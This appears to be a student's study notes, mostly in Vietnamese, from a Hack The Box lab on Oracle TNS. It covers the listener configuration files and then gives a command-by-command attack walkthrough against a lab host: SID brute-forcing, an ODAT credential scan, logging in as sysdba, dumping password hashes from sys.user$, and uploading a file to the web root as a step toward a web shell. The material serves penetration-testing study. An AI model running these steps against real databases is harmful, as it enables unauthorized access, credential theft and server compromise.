Oracle TNS (Transparent Network Substrate) là giao thức trong bộ Oracle Net Services dùng để kết nối giữa ứng dụng client và cơ sở dữ liệu Oracle.
Hỗ trợ nhiều giao thức mạng (ví dụ TCP/IP, IPX/SPX) và đã mở rộng để hoạt động với IPv6.
Là giải pháp phổ biến cho hệ cơ sở dữ liệu lớn/phức tạp trong các ngành như y tế, tài chính, bán lẻ.
Cung cấp cơ chế mã hóa truyền tải (bao gồm hỗ trợ SSL/TLS) để bảo vệ dữ liệu khi truyền qua mạng.
Đóng góp các chức năng chính: phân giải tên (name resolution), quản lý kết nối, cân bằng tải (load balancing) và bảo mật.
Mã hóa hoạt động như một lớp bảo vệ bổ sung trên TCP/IP, giảm rủi ro truy cập trái phép hoặc tấn công trên lưu lượng mạng.
Hỗ trợ công cụ quản trị: giám sát hiệu năng, phân tích, báo lỗi và ghi log.
Hỗ trợ quản lý khối lượng công việc (workload management) và chịu lỗi (fault tolerance) thông qua các dịch vụ cơ sở dữ liệu.
Phù hợp cho môi trường doanh nghiệp nơi yêu cầu bảo mật và khả năng vận hành cao.

Listener mặc định lắng nghe trên cổng TCP 1521 (có thể thay đổi lúc cài hoặc trong file cấu hình).
Hỗ trợ nhiều giao thức mạng: TCP/IP, UDP, IPX/SPX, AppleTalk.
Có thể lắng nghe trên nhiều giao diện mạng — trên một địa chỉ IP cụ thể hoặc tất cả các interface
Các cài đặt chính (cổng, giao thức, interface) thay đổi được trong file cấu hình (ví dụ listener.ora).
Quản lý từ xa: được hỗ trợ trên Oracle 8i/9i, nhưng không được bật/tương thích theo mặc định trên Oracle 10g/11g (theo đoạn văn bạn đưa).
Có thể tùy chỉnh để đáp ứng yêu cầu bảo mật và vận hành (thay đổi cổng, hạn chế interface, bật SSL/TLS, …).

File cấu hình chính: tnsnames.ora, listener.ora, sqlnet.ora — thường nằm trong $ORACLE_HOME/network/admin.
Mặc định listener: lắng nghe trên TCP/1521 (có thể đổi).
Giao thức hỗ trợ: TCP/IP (mở rộng tới IPv6), UDP, IPX/SPX, AppleTalk (tùy bản/OS).
Bảo mật mặc định: chấp nhận kết nối từ hosts được chấp thuận (hostname/IP), hỗ trợ mã hóa Oracle Net (có thể cấu hình SSL/TLS/TCPS).
Mật khẩu mặc định nguy hiểm: ví dụ CHANGE_ON_INSTALL (Oracle 9) hoặc dbsnmp cho service DBSNMP — phải đổi khi thấy.
Nguy cơ khác: dịch vụ finger hoặc dịch vụ không cần thiết chạy trên hệ có thể làm lộ thông tin; tắt các dịch vụ thừa.
Mỗi service/database có một entry trong tnsnames.ora với tên, host, port, SERVICE_NAME/SID.


Oracle TNS thường được sử dụng với các dịch vụ Oracle khác như Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, máy chủ web và nhiều dịch vụ khác. Đã có nhiều thay đổi đối với cài đặt mặc định của các dịch vụ Oracle. Ví dụ: Oracle 9 có mật khẩu mặc định là CHANGE_ON_INSTALL, trong khi Oracle 10 không có mật khẩu mặc định nào được thiết lập. Dịch vụ Oracle DBSNMP cũng sử dụng mật khẩu mặc định là dbsnmp mà chúng ta nên nhớ khi gặp phải mật khẩu này. Một ví dụ khác là nhiều tổ chức vẫn sử dụng dịch vụ finger cùng với Oracle, điều này có thể khiến dịch vụ của Oracle gặp rủi ro và dễ bị tấn công khi chúng ta có thông tin cần thiết về thư mục gốc.

Mỗi cơ sở dữ liệu hoặc dịch vụ đều có một mục duy nhất trong tệp tnsnames.ora, chứa thông tin cần thiết để máy khách kết nối với dịch vụ. Mục này bao gồm tên dịch vụ, vị trí mạng của dịch vụ và tên cơ sở dữ liệu hoặc dịch vụ mà máy khách nên sử dụng khi kết nối với dịch vụ. Ví dụ: một tệp tnsnames.ora đơn giản có thể trông như thế này:

================== FILE START ==================
Tnsnames.ora

ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )

================== FILE END ==================

Ở đây, chúng ta có thể thấy một dịch vụ có tên là ORCL, đang lắng nghe trên cổng TCP/1521 tại địa chỉ IP 10.129.11.102. Máy khách nên sử dụng tên dịch vụ là orcl khi kết nối với dịch vụ. Tuy nhiên, tệp tnsnames.ora có thể chứa nhiều mục nhập như vậy cho các cơ sở dữ liệu và dịch vụ khác nhau. Các mục nhập này cũng có thể bao gồm thông tin bổ sung, chẳng hạn như chi tiết xác thực, cài đặt nhóm kết nối và cấu hình cân bằng tải.
Mặt khác, tệp listener.ora là tệp cấu hình phía máy chủ, định nghĩa các thuộc tính và tham số của tiến trình listener, chịu trách nhiệm tiếp nhận các yêu cầu từ máy khách và chuyển tiếp chúng đến phiên bản cơ sở dữ liệu Oracle phù hợp.

================== FILE START ==================
Listener.ora

SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle

================== FILE END ==================

Tóm lại, phần mềm Oracle Net Services phía máy khách sử dụng tệp tnsnames.ora để phân giải tên dịch vụ thành địa chỉ mạng, trong khi tiến trình lắng nghe sử dụng tệp listener.ora để xác định các dịch vụ cần lắng nghe và hành vi của trình lắng nghe.

Cơ sở dữ liệu Oracle có thể được bảo vệ bằng cách sử dụng cái gọi là Danh sách Loại trừ PL/SQL (PlsqlExclusionList). Đây là một tệp văn bản do người dùng tạo, cần được đặt trong thư mục $ORACLE_HOME/sqldeveloper, và chứa tên của các gói hoặc kiểu PL/SQL cần được loại trừ khỏi quá trình thực thi. Sau khi tệp Danh sách Loại trừ PL/SQL được tạo, nó có thể được tải vào phiên bản cơ sở dữ liệu. Nó hoạt động như một danh sách đen không thể truy cập thông qua Oracle Application Server.

  | Setting              | Mô tả                                                                                                   |
  | -------------------- | ------------------------------------------------------------------------------------------------------- |
  | `DESCRIPTION`        | Mô tả (descriptor) cung cấp tên cho cơ sở dữ liệu và loại kết nối.                                      |
  | `ADDRESS`            | Địa chỉ mạng của cơ sở dữ liệu (bao gồm hostname và số cổng).                                           |
  | `PROTOCOL`           | Giao thức mạng dùng để giao tiếp với server.                                                            |
  | `PORT`               | Số cổng dùng để giao tiếp với server.                                                                   |
  | `CONNECT_DATA`       | Chỉ định các thuộc tính của kết nối, ví dụ service name hoặc SID, protocol, và identifier của instance. |
  | `INSTANCE_NAME`      | Tên của instance cơ sở dữ liệu mà client muốn kết nối.                                                  |
  | `SERVICE_NAME`       | Tên dịch vụ mà client muốn kết nối.                                                                     |
  | `SERVER`             | Loại server cho kết nối (ví dụ: dedicated hoặc shared).                                                 |
  | `USER`               | Tên user dùng để xác thực với server cơ sở dữ liệu.                                                     |
  | `PASSWORD`           | Mật khẩu dùng để xác thực với server cơ sở dữ liệu.                                                     |
  | `SECURITY`           | Loại/thiết lập bảo mật cho kết nối.                                                                     |
  | `VALIDATE_CERT`      | Có/không xác thực chứng chỉ khi sử dụng SSL/TLS.                                                        |
  | `SSL_VERSION`        | Phiên bản SSL/TLS được sử dụng cho kết nối.                                                             |
  | `CONNECT_TIMEOUT`    | Thời gian (giây) tối đa để client thiết lập kết nối tới database.                                       |
  | `RECEIVE_TIMEOUT`    | Thời gian (giây) tối đa để client chờ nhận phản hồi từ database.                                        |
  | `SEND_TIMEOUT`       | Thời gian (giây) tối đa để client gửi yêu cầu tới database.                                             |
  | `SQLNET.EXPIRE_TIME` | Thời gian (phút) để server phát hiện kết nối đã thất bại (keepalive kiểu Oracle).                       |
  | `TRACE_LEVEL`        | Mức độ trace (ghi vết) cho kết nối database.                                                            |
  | `TRACE_DIRECTORY`    | Thư mục lưu các file trace.                                                                             |
  | `TRACE_FILE_NAME`    | Tên file trace.                                                                                         |
  | `LOG_FILE`           | File dùng để lưu thông tin log.                                                                         |

Trước khi có thể liệt kê trình lắng nghe TNS và tương tác với nó, chúng ta cần tải xuống một số gói và công cụ cho phiên bản Pwnbox của mình, phòng trường hợp phiên bản này chưa có sẵn. Dưới đây là một tập lệnh Bash thực hiện tất cả những việc đó:

Setting up

  naruto3co@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
  wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
  sudo mkdir -p /opt/oracle
  sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
  sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
  export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
  export PATH=$LD_LIBRARY_PATH:$PATH
  source ~/.bashrc
  cd ~
  git clone https://github.com/quentinhardy/odat.git
  cd odat/
  pip install python-libnmap
  git submodule init
  git submodule update
  pip3 install cx_Oracle
  sudo apt-get install python3-scapy -y
  sudo pip3 install colorlog termcolor passlib python-libnmap
  sudo apt-get install build-essential libgmp-dev -y
  pip3 install pycryptodome
  
  --2025-06-24 00:24:53--  https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
  Resolving download.oracle.com (download.oracle.com)... 23.58.104.121
  Connecting to download.oracle.com (download.oracle.com)|23.58.104.121|:443... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 79386308 (76M) [application/zip]
  Saving to: ‘instantclient-basic-linux.x64-21.4.0.0.0dbru.zip’
  
  <SNIP>
  
After that, we can try to determine if the installation was successful by running the following command:
  naruto3co@htb[/htb]$ ./odat.py -h

Oracle Database Attacking Tool (ODAT) là một công cụ kiểm tra xâm nhập mã nguồn mở được viết bằng Python và được thiết kế để liệt kê và khai thác các lỗ hổng trong cơ sở dữ liệu Oracle. Công cụ này có thể được sử dụng để xác định và khai thác nhiều lỗ hổng bảo mật khác nhau trong cơ sở dữ liệu Oracle, bao gồm tấn công tiêm nhiễm SQL, thực thi mã từ xa và leo thang đặc quyền.
Bây giờ, hãy sử dụng nmap để quét cổng trình nghe Oracle TNS mặc định.

Nmap
  naruto3co@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
    
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
    Nmap scan report for 10.129.204.235
    Host is up (0.0041s latency).
    PORT     STATE SERVICE    VERSION
    1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds

kết quả nmap
  Cổng (port) đang mở và dịch vụ (service) đang chạy.
  SID (System Identifier) là tên duy nhất nhận diện một instance của cơ sở dữ liệu Oracle.
  Một hệ thống có thể có nhiều instance, mỗi instance có System ID riêng.
  Instance = tập hợp các tiến trình và vùng nhớ (processes & memory structures) phối hợp để quản lý dữ liệu của database.
  Khi client kết nối tới Oracle, nó chỉ định SID trong chuỗi kết nối (connection string).
  Client dùng SID để xác định instance cụ thể muốn kết nối.
  Nếu client không chỉ định SID, sẽ dùng giá trị mặc định được định nghĩa trong file tnsnames.ora.

Nmap - SID Bruteforcing
  naruto3co@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

We can use the odat.py tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the all option and try all modules of the odat.py tool.

ODAT
  naruto3co@htb[/htb]$ ./odat.py all -s 10.129.204.235
    [+] Checking if target 10.129.204.235:1521 is well configured for a connection...
    [+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
    ...SNIP...
    
    [!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
    [!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
    [!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
    [+] Valid credentials found: scott/tiger. Continue...
    ...SNIP...

Trong ví dụ này, chúng tôi đã tìm thấy thông tin đăng nhập hợp lệ cho người dùng Scott và mật khẩu Tiger. Sau đó, chúng ta có thể sử dụng công cụ sqlplus để kết nối và tương tác với cơ sở dữ liệu Oracle.

SQLplus - Log In
  naruto3co@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
    Cân nhắc. XE là giá trị oracle-sid-brute có thể show ra ở ./odat.py 
    
Nếu bạn gặp lỗi sau sqlplus: lỗi khi tải thư viện chia sẻ: libsqlplus.so: không thể mở tệp đối tượng chia sẻ: Không có tệp hoặc thư mục nào như vậy, vui lòng thực hiện lệnh bên dưới, trích từ đây.
  https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared

  naruto3co@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig

There are many SQLplus commands that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:
https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985

Oracle RDBMS - Interaction
  SQL> select table_name from all_tables;
  SQL> select * from user_role_privs;

Here, the user scott has no administrative privileges. However, we can try using this account to log in as the System Database Admin (sysdba), giving us higher privileges. This is possible when the user scott has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.

Oracle RDBMS - Database Enumeration
  naruto3co@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
        ///////////// Chỗ này lưu ý rất quan trong so với câu lệnh login ở ngay trên là có tham số này : as sysdba 
  SQL> select * from user_role_privs;
  
We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the sys.user$ and try to crack them offline. The query for this would look like the following:

Oracle RDBMS - Extract Password Hashes
  SQL> select name, password from sys.user$;

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

  Linux — đường dẫn: /var/www/html
  Windows — đường dẫn: C:\inetpub\wwwroot

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

Oracle RDBMS - File Upload
  naruto3co@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
  naruto3co@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

Cuối cùng, chúng ta có thể kiểm tra xem phương pháp tải tệp lên có hoạt động với curl hay không. Do đó, chúng ta sẽ sử dụng yêu cầu GET http://<IP> hoặc có thể truy cập qua trình duyệt.
  naruto3co@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt



